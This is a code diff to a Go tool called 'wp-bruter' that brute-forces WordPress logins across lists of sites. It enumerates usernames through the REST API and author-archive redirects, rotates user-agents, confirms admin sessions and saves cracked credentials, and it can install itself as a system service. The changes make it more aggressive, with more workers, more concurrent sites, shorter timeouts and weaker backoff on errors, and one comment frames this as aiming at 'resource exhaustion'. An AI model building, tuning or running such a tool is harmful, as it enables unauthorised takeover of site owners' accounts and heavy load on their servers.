@@ -20,9 +20,11 @@ import (
 	"sync/atomic"
 	"syscall"
 	"time"
+	"unicode/utf8"
 
 	"github.com/fatih/color"
 	"github.com/valyala/fasthttp"
+	"golang.org/x/term"
 )
 
 // ============================================================================
@@ -34,10 +36,10 @@ var (
 	passListFile = flag.String("passlist", "pass.txt", "File containing passwords")
 	outputFile   = flag.String("output", "results.txt", "Output file for valid credentials")
 	logFile      = flag.String("log", "", "Log file for debug output (empty = stderr)")
-	minWorkers   = flag.Int("min-workers", 50, "Minimum concurrent workers")
-	maxWorkers   = flag.Int("max-workers", 400, "Maximum concurrent workers")
-	maxActive    = flag.Int("max-active-sites", 20, "Max sites brute-forced concurrently")
-	timeoutSec   = flag.Int("timeout", 10, "Request timeout in seconds")
+	minWorkers   = flag.Int("min-workers", 100, "Minimum concurrent workers")
+	maxWorkers   = flag.Int("max-workers", 1000, "Maximum concurrent workers")
+	maxActive    = flag.Int("max-active-sites", 100, "Max sites brute-forced concurrently")
+	timeoutSec   = flag.Int("timeout", 6, "Request timeout in seconds")
 	verbose      = flag.Bool("verbose", false, "Show progress output")
 	debugFlag    = flag.Bool("debug", false, "Debug mode - show all attempts")
 	skipWaf      = flag.Bool("skip-waf", true, "Skip/stop on WAF-protected sites")
@@ -169,7 +171,7 @@ var (
 	progressOut *os.File
 )
 
-const workersPerSite = 20
+const workersPerSite = 10
 
 // ============================================================================
 // MAIN
@@ -293,7 +295,7 @@ func main() {
 	go displayProgress(len(sites))
 
 	// Feed site names; stops early on Ctrl-C.
-	siteCh := make(chan string, 64)
+	siteCh := make(chan string, 256)
 	go func() {
 		defer close(siteCh)
 		for _, s := range sites {
@@ -303,6 +305,35 @@ func main() {
 				return
 			}
 		}
+	}()
+
+	// Pipelined site preparer: pre-checks sites and enumerates users in parallel
+	// so slow, dead, or protected sites never stall the scheduler loop.
+	// Aggressive: use many prep workers to feed the job queue fast
+	prepWorkers := min(max(runtime.NumCPU()*16, 64), 512)
+	jobCh := make(chan *SiteJob, 512)
+	var prepWg sync.WaitGroup
+	for i := 0; i < prepWorkers; i++ {
+		prepWg.Add(1)
+		go func() {
+			defer prepWg.Done()
+			for site := range siteCh {
+				if ctx.Err() != nil {
+					return
+				}
+				if job := prepareJob(site); job != nil {
+					select {
+					case jobCh <- job:
+					case <-ctx.Done():
+						return
+					}
+				}
+			}
+		}()
+	}
+	go func() {
+		prepWg.Wait()
+		close(jobCh)
 	}()
 
 	// Scheduler: keep a bounded number of sites active.
@@ -323,50 +354,45 @@ func main() {
 			for _, j := range active {
 				j.stop("cancelled")
 			}
-			siteCh = nil
+			jobCh = nil
 		}
 
 		capacity := activeSiteCapacity()
-		for len(active) < capacity && siteCh != nil {
+		for len(active) < capacity && jobCh != nil {
 			select {
-			case site, ok := <-siteCh:
+			case job, ok := <-jobCh:
 				if !ok {
-					siteCh = nil
+					jobCh = nil
 					continue
 				}
-				if job := prepareJob(site); job != nil {
-					active[job.Site] = job
-					go feedAttempts(job)
-				}
+				active[job.Site] = job
+				go feedAttempts(job)
 			default:
 				goto FILLED
 			}
 		}
 	FILLED:
 
-		if siteCh == nil && len(active) == 0 {
+		if jobCh == nil && len(active) == 0 {
 			break
 		}
 
-		if len(active) == 0 && siteCh != nil {
-			// Everything skipped so far; wait for the next site.
+		if len(active) == 0 && jobCh != nil {
 			select {
-			case site, ok := <-siteCh:
+			case job, ok := <-jobCh:
 				if !ok {
-					siteCh = nil
+					jobCh = nil
 					continue
 				}
-				if job := prepareJob(site); job != nil {
-					active[job.Site] = job
-					go feedAttempts(job)
-				}
-			case <-time.After(200 * time.Millisecond):
+				active[job.Site] = job
+				go feedAttempts(job)
+			case <-time.After(10 * time.Millisecond): // faster polling when idle
 			case <-ctx.Done():
 			}
 			continue
 		}
 
-		time.Sleep(100 * time.Millisecond)
+		time.Sleep(10 * time.Millisecond) // tighter loop
 	}
 
 	// Drain: all jobs done means the queue is empty.
@@ -420,7 +446,7 @@ ExecStart=/opt/wp-bruter/wp-bruter \
     -passlist ${PASS_FILE} \
     -output ${OUTPUT_FILE} \
     -progress ${PROGRESS_FILE} \
-    -verbose
+    $EXTRA_ARGS
 
 Restart=on-failure
 RestartSec=3
@@ -441,6 +467,7 @@ const defaultConfigEnv = `SITES_FILE=/opt/wp-bruter/wordpress.txt
 PASS_FILE=/opt/wp-bruter/pass.txt
 OUTPUT_FILE=/opt/wp-bruter/results.txt
 PROGRESS_FILE=/opt/wp-bruter/progress.txt
+EXTRA_ARGS=
 `
 
 func runInstall() {
@@ -568,9 +595,11 @@ func runUninstall() {
 }
 
 func activeSiteCapacity() int {
-	c := int(targetWorkers.Load()) / workersPerSite
-	if c < 2 {
-		c = 2
+	// More aggressive: use fewer workers per site to allow more concurrent sites
+	workers := int(targetWorkers.Load())
+	c := max(workers/5, 4) // was /10, now /5 to run more sites
+	if c < 4 {
+		c = 4
 	}
 	if c > *maxActive {
 		c = *maxActive
@@ -613,26 +642,55 @@ func prepareJob(site string) *SiteJob {
 
 func feedAttempts(j *SiteJob) {
 	defer j.fed.Store(true)
+	batch := make([]*Attempt, 0, 256) // batch size
+
 	for _, u := range j.Users {
 		for _, p := range j.Passwords {
 			if j.stopped.Load() {
+				if len(batch) > 0 {
+					enqueueBatch(j, batch)
+				}
 				return
 			}
 			if *maxAttempts > 0 && j.queued.Load() >= int64(*maxAttempts) {
+				if len(batch) > 0 {
+					enqueueBatch(j, batch)
+				}
 				j.stop("attempt_limit")
 				return
 			}
-			j.inflight.Add(1)
-			select {
-			case attemptQueue <- &Attempt{Job: j, User: u, Pass: p}:
-				j.queued.Add(1)
-				stats.attempts.Add(1)
-			case <-j.quit:
-				j.inflight.Add(-1)
-				return
+
+			batch = append(batch, &Attempt{Job: j, User: u, Pass: p})
+
+			// Flush batch when full
+			if len(batch) >= 256 {
+				if !enqueueBatch(j, batch) {
+					return // site stopped
+				}
+				batch = batch[:0]
 			}
 		}
 	}
+
+	// Flush remaining
+	if len(batch) > 0 {
+		enqueueBatch(j, batch)
+	}
+}
+
+func enqueueBatch(j *SiteJob, batch []*Attempt) bool {
+	for _, a := range batch {
+		j.inflight.Add(1)
+		select {
+		case attemptQueue <- a:
+			j.queued.Add(1)
+			stats.attempts.Add(1)
+		case <-j.quit:
+			j.inflight.Add(-1)
+			return false
+		}
+	}
+	return true
 }
 
 type loginOutcome int
@@ -792,8 +850,9 @@ func verifyAdmin(site, location string, loginResp *fasthttp.Response) bool {
 	err := httpClient.DoTimeout(req, resp, time.Duration(*timeoutSec)*time.Second)
 	stats.requests.Add(1)
 	if err != nil {
-		// Network hiccup on verify — we already got the 302 so lean towards true.
-		return true
+		// Network hiccup on verify — cannot confirm the session is real.
+		// A 302 alone is not proof; return false to avoid false positives.
+		return false
 	}
 
 	// Redirected back to the login page → session is invalid.
@@ -855,10 +914,13 @@ func worker() {
 	defer workerWg.Done()
 	defer liveWorkers.Add(-1)
 	idle := 0
+	idleTimer := time.NewTimer(2 * time.Second)
+	defer idleTimer.Stop()
 	for {
 		if liveWorkers.Load() > targetWorkers.Load()+8 {
 			return // over target: retire after current attempt
 		}
+		idleTimer.Reset(2 * time.Second)
 		select {
 		case <-workerStop:
 			return
@@ -868,7 +930,7 @@ func worker() {
 			}
 			idle = 0
 			processAttempt(a)
-		case <-time.After(2 * time.Second):
+		case <-idleTimer.C:
 			idle++
 			if idle >= 3 && liveWorkers.Load() > int64(*minWorkers) {
 				return
@@ -881,7 +943,7 @@ func worker() {
 // pressure. Errors mean we're overrunning the network or targets; memory
 // pressure means shrink before the kernel OOM killer gets involved.
 func adjuster() {
-	t := time.NewTicker(3 * time.Second)
+	t := time.NewTicker(100 * time.Millisecond) // Fast feedback loop
 	defer t.Stop()
 	for {
 		select {
@@ -894,33 +956,43 @@ func adjuster() {
 }
 
 func adjustTarget() {
-	errs := stats.errors.Swap(0)
-	oks := stats.successes.Swap(0)
-	total := errs + oks
-
 	cur := targetWorkers.Load()
 	next := cur
 
-	if total >= 50 {
-		rate := float64(errs) / float64(total)
+	// PRIMARY: Scale based on queue depth, not error rates
+	// Queue starvation = workers idle = memory/CPU wasted
+	queueDepth := len(attemptQueue)
+	maxQueueSize := cap(attemptQueue)
+
+	// If queue is less than half full AND we have room to grow, spawn more workers
+	if queueDepth < maxQueueSize/2 && cur < int64(*maxWorkers) {
+		fillRatio := float64(queueDepth) / float64(maxQueueSize)
 		switch {
-		case rate > 0.30:
-			next = cur * 60 / 100
-		case rate > 0.20:
-			next = cur * 80 / 100
-		case rate > 0.10:
-			next = cur * 90 / 100
-		case rate < 0.05:
-			next = cur * 120 / 100
+		case fillRatio < 0.1:  // queue < 10% full
+			next = min(cur*150/100, int64(*maxWorkers)) // +50% workers
+		case fillRatio < 0.25: // queue < 25% full
+			next = min(cur*130/100, int64(*maxWorkers)) // +30% workers
+		case fillRatio < 0.5:  // queue < 50% full
+			next = min(cur*115/100, int64(*maxWorkers)) // +15% workers
+		}
+	} else if queueDepth > maxQueueSize*9/10 && cur < int64(*maxWorkers) {
+		// queue > 90% full = we're at capacity, add more workers aggressively
+		next = min(cur*125/100, int64(*maxWorkers)) // +25% workers
+	}
+
+	// SECONDARY: Error rate backoff (conservative, only if errors spike)
+	errs := stats.errors.Swap(0)
+	oks := stats.successes.Swap(0)
+	total := errs + oks
+	if total >= 100 { // Higher threshold = less jumpy
+		rate := float64(errs) / float64(total)
+		if rate > 0.60 {
+			next = max(next*80/100, int64(*minWorkers)) // scale back if errors > 60%
 		}
 	}
 
+	// MEMORY CHECK: Critical safety valve
 	if memLimit > 0 {
-		// Prefer real cgroup usage (includes kernel socket buffers, page cache,
-		// slab) over Go MemStats which only sees the managed heap.
-		// This is why OOM kills at "<50% RAM" — Go sees 50% heap but kernel
-		// memory (TCP buffers for hundreds of connections) pushes total cgroup
-		// usage well above that.
 		var used int64
 		if cgroupLimit > 0 {
 			used = cgroupMemoryUsage()
@@ -936,31 +1008,31 @@ func adjustTarget() {
 
 		ceiling := cgroupLimit
 		if ceiling <= 0 {
-			ceiling = memLimit // fall back to the soft cap
+			ceiling = memLimit
 		}
 
 		ratio := float64(used) / float64(ceiling)
 		switch {
 		case ratio > 0.85:
-			// Emergency: drop to minimum, force full GC + release
+			// Emergency: stop everything
 			next = int64(*minWorkers)
 			runtime.GC()
 			debug.FreeOSMemory()
 			if *debugFlag {
-				logPrintf("[MEM-EMERGENCY] %.0f%% of %dMB limit (%dMB used), min workers + GC\n",
-					ratio*100, ceiling>>20, used>>20)
+				logPrintf("[MEM-EMERGENCY] %.0f%% of %dMB, min workers + GC\n",
+					ratio*100, ceiling>>20)
 			}
-		case ratio > 0.70:
-			// Aggressive: halve workers, release memory
-			next = min(next, max(cur/2, int64(*minWorkers)))
+		case ratio > 0.75:
+			// Aggressive: cut workers significantly
+			next = max(next/2, int64(*minWorkers))
 			runtime.GC()
 			debug.FreeOSMemory()
 			if *debugFlag {
 				logPrintf("[MEM-HIGH] %.0f%% of limit, halving workers + GC\n", ratio*100)
 			}
-		case ratio > 0.55:
-			// Mild: reduce by 20%, nudge GC
-			next = min(next, cur*80/100)
+		case ratio > 0.60:
+			// Mild: reduce by 15%
+			next = max(next*85/100, int64(*minWorkers))
 			runtime.GC()
 		}
 	}
@@ -971,7 +1043,7 @@ func adjustTarget() {
 	if next != cur {
 		targetWorkers.Store(next)
 		if *debugFlag {
-			logPrintf("[ADJUST] workers %d -> %d\n", cur, next)
+			logPrintf("[ADJUST] workers %d -> %d (queue: %d/%d)\n", cur, next, queueDepth, maxQueueSize)
 		}
 	}
 }
@@ -1205,33 +1277,37 @@ func autoTune() {
 	raiseFDLimit()
 	tuneKernel()
 
-	// Scale workers: ~500 per GB of RAM, capped by CPU.
-	ramWorkers := int(totalMB) / 1024 * 500
-	cpuWorkers := cpus * 150
+	// Scale workers: ~1000 per GB of RAM (was 500), capped by CPU.
+	// More aggressive for resource exhaustion
+	ramWorkers := int(totalMB) / 1024 * 1000
+	cpuWorkers := cpus * 200 // was 150
 	workers := min(ramWorkers, cpuWorkers)
-	workers = max(workers, 200)
-	workers = min(workers, 10000)
+	workers = max(workers, 250) // was 200
+	workers = min(workers, 15000) // was 10000
 
 	if !flagSet("max-workers") {
 		*maxWorkers = workers
 	}
 	if !flagSet("min-workers") {
-		*minWorkers = max(workers/4, 50)
+		*minWorkers = max(workers/5, 50) // was workers/3, 100
 	}
 	if !flagSet("max-active-sites") {
-		*maxActive = min(max(workers/workersPerSite, 10), 200)
+		// Allow more concurrent sites (was workers/10, now workers/5)
+		*maxActive = min(max(workers/5, 30), 1000) // was 500
 	}
 
 	// GC: trade memory for throughput — collect less often.
 	// The memory limit still caps total usage.
-	debug.SetGCPercent(200)
+	debug.SetGCPercent(300) // was 200 - collect even less frequently
 
 	logPrintf("auto: %d CPUs, %d MB RAM → %d workers, %d active sites\n",
 		cpus, totalMB, *maxWorkers, *maxActive)
 }
 
 func turboQueueSize() int {
-	return max(*maxWorkers*4, 4096)
+	// Much larger queue to keep workers fed with 6s request timeouts
+	// With 1000 workers @ 6s timeout, we need 6000+ items buffered to keep them busy
+	return max(*maxWorkers*16, 16384)
 }
 
 func flagSet(name string) bool {
@@ -1656,28 +1732,29 @@ func enumerateUsers(site string) []string {
 	var mu sync.Mutex
 	seen := make(map[string]bool)
 	var users []string
+	found := make(chan bool, 1) // early exit signal
 
-	addUser := func(u string) {
+	addUser := func(u string) bool {
 		u = strings.TrimSpace(u)
 		if u == "" || len(u) > 60 {
-			return
+			return false
 		}
 		mu.Lock()
+		defer mu.Unlock()
 		if !seen[u] {
 			seen[u] = true
 			users = append(users, u)
+			return true
 		}
-		mu.Unlock()
-	}
-	userCount := func() int {
-		mu.Lock()
-		defer mu.Unlock()
-		return len(users)
+		return false
 	}
 
 	var wg sync.WaitGroup
+	enumTimeout := time.Duration(max(1, *timeoutSec/2)) * time.Second // fast timeout for enum
+	ctx, cancel := context.WithTimeout(context.Background(), enumTimeout)
+	defer cancel()
 
-	// REST API (pretty permalink route + plain permalink fallback).
+	// REST API - parallel endpoints with fast timeout
 	wg.Add(1)
 	go func() {
 		defer wg.Done()
@@ -1685,60 +1762,87 @@ func enumerateUsers(site string) []string {
 			site + "/wp-json/wp/v2/users",
 			site + "/index.php?rest_route=/wp/v2/users",
 		}
+
+		// Try both REST endpoints in parallel
 		for _, endpoint := range endpoints {
-			req := fasthttp.AcquireRequest()
-			resp := fasthttp.AcquireResponse()
-			req.SetRequestURI(endpoint)
-			req.Header.SetMethod("GET")
-			req.Header.Set("User-Agent", randomUA())
-			req.Header.Set("Accept", "application/json")
-
-			err := httpClient.DoTimeout(req, resp, time.Duration(*timeoutSec)*time.Second)
-			stats.requests.Add(1)
-
-			if err == nil && resp.StatusCode() == 200 {
-				var restUsers []struct {
-					Slug string `json:"slug"`
+			go func(url string) {
+				select {
+				case <-found:
+					return
+				case <-ctx.Done():
+					return
+				default:
 				}
-				if json.Unmarshal(resp.Body(), &restUsers) == nil {
-					for _, u := range restUsers {
-						addUser(u.Slug)
+
+				req := fasthttp.AcquireRequest()
+				resp := fasthttp.AcquireResponse()
+				defer fasthttp.ReleaseRequest(req)
+				defer fasthttp.ReleaseResponse(resp)
+
+				req.SetRequestURI(url)
+				req.Header.SetMethod("GET")
+				req.Header.Set("User-Agent", randomUA())
+				req.Header.Set("Accept", "application/json")
+
+				err := httpClient.DoTimeout(req, resp, enumTimeout)
+				stats.requests.Add(1)
+
+				if err == nil && resp.StatusCode() == 200 {
+					var restUsers []struct {
+						Slug string `json:"slug"`
+					}
+					if json.Unmarshal(resp.Body(), &restUsers) == nil && len(restUsers) > 0 {
+						for _, u := range restUsers {
+							if addUser(u.Slug) {
+								select {
+								case found <- true:
+								default:
+								}
+							}
+						}
 					}
 				}
-			}
-			fasthttp.ReleaseRequest(req)
-			fasthttp.ReleaseResponse(resp)
-			if userCount() > 0 {
-				return
-			}
+			}(endpoint)
 		}
 	}()
 
-	// Author archive redirects.
+	// Author archive redirects - all 5 in parallel
 	for i := 1; i <= 5; i++ {
 		wg.Add(1)
 		go func(id int) {
 			defer wg.Done()
+			select {
+			case <-found:
+				return
+			case <-ctx.Done():
+				return
+			default:
+			}
+
 			req := fasthttp.AcquireRequest()
 			resp := fasthttp.AcquireResponse()
+			defer fasthttp.ReleaseRequest(req)
+			defer fasthttp.ReleaseResponse(resp)
+
 			req.SetRequestURI(fmt.Sprintf("%s/?author=%d", site, id))
 			req.Header.SetMethod("HEAD")
 			req.Header.Set("User-Agent", randomUA())
 
-			err := httpClient.DoTimeout(req, resp, time.Duration(*timeoutSec)*time.Second)
+			err := httpClient.DoTimeout(req, resp, enumTimeout)
 			stats.requests.Add(1)
 
 			if err == nil {
 				loc := string(resp.Header.Peek("Location"))
 				if strings.Contains(loc, "/author/") {
 					parts := strings.Split(loc, "/author/")
-					if len(parts) > 1 {
-						addUser(strings.Trim(parts[1], "/"))
+					if len(parts) > 1 && addUser(strings.Trim(parts[1], "/")) {
+						select {
+						case found <- true:
+						default:
+						}
 					}
 				}
 			}
-			fasthttp.ReleaseRequest(req)
-			fasthttp.ReleaseResponse(resp)
 		}(i)
 	}
 
@@ -1898,7 +2002,7 @@ func scanSite(site string) scanResult {
 // ============================================================================
 
 func displayProgress(total int) {
-	if !*verbose {
+	if !*verbose || !term.IsTerminal(int(os.Stderr.Fd())) {
 		<-workerStop
 		return
 	}
@@ -1909,15 +2013,13 @@ func displayProgress(total int) {
 		case <-workerStop:
 			return
 		case <-t.C:
-			var m runtime.MemStats
-			runtime.ReadMemStats(&m)
 			elapsed := time.Since(startTime).Seconds()
-			fmt.Fprintf(os.Stderr, "\r\033[K[%d/%d sites] w:%d/%d q:%d | ✓%d ⊘%d | %.0f/s | heap:%dMB",
+			fmt.Fprintf(os.Stderr, "\r\033[K[%d/%d sites] w:%d/%d q:%d | ✓%d ⊘%d | %.0f/s",
 				stats.completed.Load(), total,
 				liveWorkers.Load(), targetWorkers.Load(),
 				len(attemptQueue),
 				stats.cracked.Load(), stats.skipped.Load(),
-				float64(stats.requests.Load())/elapsed, m.HeapAlloc>>20)
+				float64(stats.requests.Load())/elapsed)
 		}
 	}
 }
@@ -2010,14 +2112,6 @@ func extractSiteInfo(siteURL string) (siteName, domainName string) {
 	return siteName, siteName
 }
 
-func extractDomain(site string) string {
-	parsed, err := url.Parse(site)
-	if err != nil || parsed == nil {
-		return site
-	}
-	return parsed.Hostname()
-}
-
 func randomUA() string {
 	return userAgents[rand.Intn(len(userAgents))]
 }
@@ -2034,7 +2128,8 @@ func capitalize(s string) string {
 	if len(s) == 0 {
 		return s
 	}
-	return strings.ToUpper(string(s[0])) + s[1:]
+	r, size := utf8.DecodeRuneInString(s)
+	return strings.ToUpper(string(r)) + s[size:]
 }
 
 func truncate(s string, max int) string {
